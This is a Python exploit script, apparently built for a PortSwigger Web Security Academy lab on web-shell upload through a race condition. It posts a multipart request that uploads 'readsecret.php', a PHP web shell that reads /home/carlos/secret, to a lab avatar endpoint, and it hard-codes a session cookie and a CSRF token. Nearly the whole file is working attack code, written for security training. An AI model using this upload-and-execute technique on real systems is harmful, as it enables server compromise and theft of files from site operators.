import requests

session = requests.session()

burp0_url = "https://ac7a1fba1f0815a1c08322ca00570001.web-security-academy.net:443/my-account/avatar"
burp0_cookies = {"session": "bw5ztNP3H1ts73CHPZmeKCEp9fuQFq0t"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "multipart/form-data; boundary=---------------------------178567536425530771281086364460", "Origin": "https://ac7a1fba1f0815a1c08322ca00570001.web-security-academy.net", "Dnt": "1", "Referer": "https://ac7a1fba1f0815a1c08322ca00570001.web-security-academy.net/my-account", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Sec-Gpc": "1", "Te": "trailers", "Connection": "close"}
burp0_data = "-----------------------------178567536425530771281086364460\r\nContent-Disposition: form-data; name=\"avatar\"; filename=\"readsecret.php\"\r\nContent-Type: application/x-php\r\n\r\n<!-- https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload -->\n\n<?php echo file_get_contents('/home/carlos/secret'); ?> \r\n-----------------------------178567536425530771281086364460\r\nContent-Disposition: form-data; name=\"user\"\r\n\r\nwiener\r\n-----------------------------178567536425530771281086364460\r\nContent-Disposition: form-data; name=\"csrf\"\r\n\r\n1swR43lxQtCtmDCDy7ocU9qIltcdD3ZV\r\n-----------------------------178567536425530771281086364460--\r\n"
# session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)

###########################################

# https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition

url = burp0_url
temp_url1 = "https://ac7a1fba1f0815a1c08322ca00570001.web-security-academy.net/files/avatars/readsecret.php"
print(f"{url}\n{temp_url1}")
cookies = burp0_cookies
headers = burp0_headers
data = burp0_data



def upload_flie():
    response_upload = requests.post(url, data=data, headers=headers, cookies=cookies, proxies={"http": "http://127.0.0.1:8080"})
    # response_temp1 = requests.get(temp_url1, headers=headers, cookies=cookies, proxies={"http": "http://127.0.0.1:8080"})
    # print(f"location result:{response_temp1.content}\n")
    print(f"upload status code: {response_upload.status_code}\n")

if __name__ == '__main__':
    upload_flie()